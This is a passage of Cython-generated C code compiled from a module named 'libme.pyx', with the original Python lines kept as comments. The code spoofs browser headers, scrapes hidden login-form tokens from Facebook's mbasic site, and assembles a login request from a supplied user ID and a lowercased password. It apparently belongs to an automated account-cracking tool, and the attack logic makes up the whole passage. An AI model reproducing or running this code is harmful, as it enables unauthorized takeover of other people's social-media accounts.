    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_8);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_8, function);
      }
    }
    __pyx_t_3 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 819, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF_SET(__pyx_v_ses, __pyx_t_3);
    __pyx_t_3 = 0;

    /* "libme.pyx":820
 * 			pw = pw.lower()
 * 			ses = requests.Session()
 * 			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})             # <<<<<<<<<<<<<<
 * 			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
 * 			b = parser(p,"html.parser")
 */
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_headers); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 820, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_update); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 820, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = __Pyx_PyDict_NewPresized(10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 820, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_origin, __pyx_v_host) < 0) __PYX_ERR(0, 820, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_8, __pyx_kp_s_accept_language, __pyx_kp_s_id_ID_id_q_0_9_en_US_q_0_8_en_q) < 0) __PYX_ERR(0, 820, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_8, __pyx_kp_s_accept_encoding, __pyx_kp_s_gzip_deflate) < 0) __PYX_ERR(0, 820, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_accept, __pyx_kp_s_text_html_application_xhtml_xml) < 0) __PYX_ERR(0, 820, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_8, __pyx_kp_s_user_agent, __pyx_v_ua) < 0) __PYX_ERR(0, 820, __pyx_L1_error)
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_bs4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 820, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_re); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 820, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_findall); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 820, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = NULL;
    __pyx_t_10 = 0;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_2)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_2);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
        __pyx_t_10 = 1;
      }
    }
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(__pyx_t_4)) {
      PyObject *__pyx_temp[3] = {__pyx_t_2, __pyx_kp_s__55, __pyx_v_host};
      __pyx_t_6 = __Pyx_PyFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 820, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_GOTREF(__pyx_t_6);
    } else
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(__pyx_t_4)) {
      PyObject *__pyx_temp[3] = {__pyx_t_2, __pyx_kp_s__55, __pyx_v_host};
      __pyx_t_6 = __Pyx_PyCFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 820, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_GOTREF(__pyx_t_6);
    } else
    #endif
    {
      __pyx_t_11 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 820, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_11);
      if (__pyx_t_2) {
        __Pyx_GIVEREF(__pyx_t_2); PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_2); __pyx_t_2 = NULL;
      }
      __Pyx_INCREF(__pyx_kp_s__55);
      __Pyx_GIVEREF(__pyx_kp_s__55);
      PyTuple_SET_ITEM(__pyx_t_11, 0+__pyx_t_10, __pyx_kp_s__55);
      __Pyx_INCREF(__pyx_v_host);
      __Pyx_GIVEREF(__pyx_v_host);
      PyTuple_SET_ITEM(__pyx_t_11, 1+__pyx_t_10, __pyx_v_host);
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_11, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 820, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
    }
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyString_Join(__pyx_kp_s_, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 820, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_Host, __pyx_t_4) < 0) __PYX_ERR(0, 820, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = PyNumber_Add(__pyx_v_host, __pyx_kp_s_login_next_ref_dbl_fl_refid_8); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 820, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_referer, __pyx_t_4) < 0) __PYX_ERR(0, 820, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (PyDict_SetItem(__pyx_t_8, __pyx_kp_s_cache_control, __pyx_kp_s_max_age_0) < 0) __PYX_ERR(0, 820, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_8, __pyx_kp_s_upgrade_insecure_requests, __pyx_kp_s_1) < 0) __PYX_ERR(0, 820, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_8, __pyx_kp_s_content_type, __pyx_kp_s_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 820, __pyx_L1_error)
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_7);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_7, function);
      }
    }
    __pyx_t_3 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_4, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_8);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 820, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    /* "libme.pyx":821
 * 			ses = requests.Session()
 * 			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
 * 			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text             # <<<<<<<<<<<<<<
 * 			b = parser(p,"html.parser")
 * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 */
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_get); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 821, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_8 = PyNumber_Add(__pyx_v_host, __pyx_kp_s_login_next_ref_dbl_refid_8); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 821, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_7);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_7, function);
      }
    }
    __pyx_t_3 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_4, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_8);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 821, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_text); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 821, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF_SET(__pyx_v_p, __pyx_t_7);
    __pyx_t_7 = 0;

    /* "libme.pyx":822
 * 			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
 * 			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
 * 			b = parser(p,"html.parser")             # <<<<<<<<<<<<<<
 * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 * 			for i in b("input"):
 */
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_parser); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 822, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_8 = NULL;
    __pyx_t_10 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_8)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_8);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
        __pyx_t_10 = 1;
      }
    }
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(__pyx_t_3)) {
      PyObject *__pyx_temp[3] = {__pyx_t_8, __pyx_v_p, __pyx_kp_s_html_parser};
      __pyx_t_7 = __Pyx_PyFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 822, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_GOTREF(__pyx_t_7);
    } else
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(__pyx_t_3)) {
      PyObject *__pyx_temp[3] = {__pyx_t_8, __pyx_v_p, __pyx_kp_s_html_parser};
      __pyx_t_7 = __Pyx_PyCFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 822, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_GOTREF(__pyx_t_7);
    } else
    #endif
    {
      __pyx_t_4 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 822, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (__pyx_t_8) {
        __Pyx_GIVEREF(__pyx_t_8); PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_8); __pyx_t_8 = NULL;
      }
      __Pyx_INCREF(__pyx_v_p);
      __Pyx_GIVEREF(__pyx_v_p);
      PyTuple_SET_ITEM(__pyx_t_4, 0+__pyx_t_10, __pyx_v_p);
      __Pyx_INCREF(__pyx_kp_s_html_parser);
      __Pyx_GIVEREF(__pyx_kp_s_html_parser);
      PyTuple_SET_ITEM(__pyx_t_4, 1+__pyx_t_10, __pyx_kp_s_html_parser);
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_4, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 822, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    }
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF_SET(__pyx_v_b, __pyx_t_7);
    __pyx_t_7 = 0;

    /* "libme.pyx":823
 * 			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
 * 			b = parser(p,"html.parser")
 * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]             # <<<<<<<<<<<<<<
 * 			for i in b("input"):
 * 				try:
 */
    __pyx_t_7 = PyList_New(7); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 823, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_INCREF(__pyx_n_s_lsd);
    __Pyx_GIVEREF(__pyx_n_s_lsd);
    PyList_SET_ITEM(__pyx_t_7, 0, __pyx_n_s_lsd);
    __Pyx_INCREF(__pyx_n_s_jazoest);
    __Pyx_GIVEREF(__pyx_n_s_jazoest);
    PyList_SET_ITEM(__pyx_t_7, 1, __pyx_n_s_jazoest);
    __Pyx_INCREF(__pyx_n_s_m_ts);
    __Pyx_GIVEREF(__pyx_n_s_m_ts);
    PyList_SET_ITEM(__pyx_t_7, 2, __pyx_n_s_m_ts);
    __Pyx_INCREF(__pyx_n_s_li);
    __Pyx_GIVEREF(__pyx_n_s_li);
    PyList_SET_ITEM(__pyx_t_7, 3, __pyx_n_s_li);
    __Pyx_INCREF(__pyx_n_s_try_number);
    __Pyx_GIVEREF(__pyx_n_s_try_number);
    PyList_SET_ITEM(__pyx_t_7, 4, __pyx_n_s_try_number);
    __Pyx_INCREF(__pyx_n_s_unrecognized_tries);
    __Pyx_GIVEREF(__pyx_n_s_unrecognized_tries);
    PyList_SET_ITEM(__pyx_t_7, 5, __pyx_n_s_unrecognized_tries);
    __Pyx_INCREF(__pyx_n_s_login_2);
    __Pyx_GIVEREF(__pyx_n_s_login_2);
    PyList_SET_ITEM(__pyx_t_7, 6, __pyx_n_s_login_2);
    __Pyx_XDECREF_SET(__pyx_v_bl, ((PyObject*)__pyx_t_7));
    __pyx_t_7 = 0;

    /* "libme.pyx":824
 * 			b = parser(p,"html.parser")
 * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 * 			for i in b("input"):             # <<<<<<<<<<<<<<
 * 				try:
 * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
 */
    __Pyx_INCREF(__pyx_v_b);
    __pyx_t_3 = __pyx_v_b; __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_7 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_n_s_input) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_n_s_input);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 824, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (likely(PyList_CheckExact(__pyx_t_7)) || PyTuple_CheckExact(__pyx_t_7)) {
      __pyx_t_3 = __pyx_t_7; __Pyx_INCREF(__pyx_t_3); __pyx_t_12 = 0;
      __pyx_t_13 = NULL;
    } else {
      __pyx_t_12 = -1; __pyx_t_3 = PyObject_GetIter(__pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 824, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_13 = Py_TYPE(__pyx_t_3)->tp_iternext; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 824, __pyx_L1_error)
    }
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    for (;;) {
      if (likely(!__pyx_t_13)) {
        if (likely(PyList_CheckExact(__pyx_t_3))) {
          if (__pyx_t_12 >= PyList_GET_SIZE(__pyx_t_3)) break;
          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
          __pyx_t_7 = PyList_GET_ITEM(__pyx_t_3, __pyx_t_12); __Pyx_INCREF(__pyx_t_7); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 824, __pyx_L1_error)
          #else
          __pyx_t_7 = PySequence_ITEM(__pyx_t_3, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 824, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_7);
          #endif
        } else {
          if (__pyx_t_12 >= PyTuple_GET_SIZE(__pyx_t_3)) break;
          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
          __pyx_t_7 = PyTuple_GET_ITEM(__pyx_t_3, __pyx_t_12); __Pyx_INCREF(__pyx_t_7); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 824, __pyx_L1_error)
          #else
          __pyx_t_7 = PySequence_ITEM(__pyx_t_3, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 824, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_7);
          #endif
        }
      } else {
        __pyx_t_7 = __pyx_t_13(__pyx_t_3);
        if (unlikely(!__pyx_t_7)) {
          PyObject* exc_type = PyErr_Occurred();
          if (exc_type) {
            if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
            else __PYX_ERR(0, 824, __pyx_L1_error)
          }
          break;
        }
        __Pyx_GOTREF(__pyx_t_7);
      }
      __Pyx_XDECREF_SET(__pyx_v_i, __pyx_t_7);
      __pyx_t_7 = 0;

      /* "libme.pyx":825
 * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 * 			for i in b("input"):
 * 				try:             # <<<<<<<<<<<<<<
 * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
 * 					else:continue
 */
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_15, &__pyx_t_16);
        __Pyx_XGOTREF(__pyx_t_14);
        __Pyx_XGOTREF(__pyx_t_15);
        __Pyx_XGOTREF(__pyx_t_16);
        /*try:*/ {

          /* "libme.pyx":826
 * 			for i in b("input"):
 * 				try:
 * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})             # <<<<<<<<<<<<<<
 * 					else:continue
 * 				except:pass
 */
          __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_i, __pyx_n_s_get); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 826, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_8 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
            __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_4);
            if (likely(__pyx_t_8)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
              __Pyx_INCREF(__pyx_t_8);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_4, function);
            }
          }
          __pyx_t_7 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_8, __pyx_n_s_name) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_n_s_name);
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
          if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 826, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_17 = (__Pyx_PySequence_ContainsTF(__pyx_t_7, __pyx_v_bl, Py_EQ)); if (unlikely(__pyx_t_17 < 0)) __PYX_ERR(0, 826, __pyx_L7_error)
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_18 = (__pyx_t_17 != 0);
          if (__pyx_t_18) {
            __pyx_t_7 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 826, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_i, __pyx_n_s_get); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 826, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_6 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
              __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_8);
              if (likely(__pyx_t_6)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_8, function);
              }
            }
            __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_6, __pyx_n_s_name) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_n_s_name);
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 826, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_i, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 826, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_11 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
              __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_6);
              if (likely(__pyx_t_11)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_11);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_6, function);
              }
            }
            __pyx_t_8 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_11, __pyx_n_s_value) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_n_s_value);
            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
            if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 826, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            if (PyDict_SetItem(__pyx_t_7, __pyx_t_4, __pyx_t_8) < 0) __PYX_ERR(0, 826, __pyx_L7_error)
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_8 = __Pyx_CallUnboundCMethod1(&__pyx_umethod_PyDict_Type_update, __pyx_v_kwargs, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 826, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            goto __pyx_L15;
          }

          /* "libme.pyx":827
 * 				try:
 * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
 * 					else:continue             # <<<<<<<<<<<<<<
 * 				except:pass
 * 			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
 */
          /*else*/ {
            goto __pyx_L13_try_continue;
          }
          __pyx_L15:;

          /* "libme.pyx":825
 * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 * 			for i in b("input"):
 * 				try:             # <<<<<<<<<<<<<<
 * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
 * 					else:continue
 */
        }
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
        __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
        goto __pyx_L14_try_end;
        __pyx_L7_error:;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

        /* "libme.pyx":828
 * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
 * 					else:continue
 * 				except:pass             # <<<<<<<<<<<<<<
 * 			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
 * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 */
        /*except:*/ {
          __Pyx_ErrRestore(0,0,0);
          goto __pyx_L8_exception_handled;
        }
        __pyx_L13_try_continue:;

        /* "libme.pyx":825
 * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 * 			for i in b("input"):
 * 				try:             # <<<<<<<<<<<<<<
 * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
 * 					else:continue
 */
        __Pyx_XGIVEREF(__pyx_t_14);
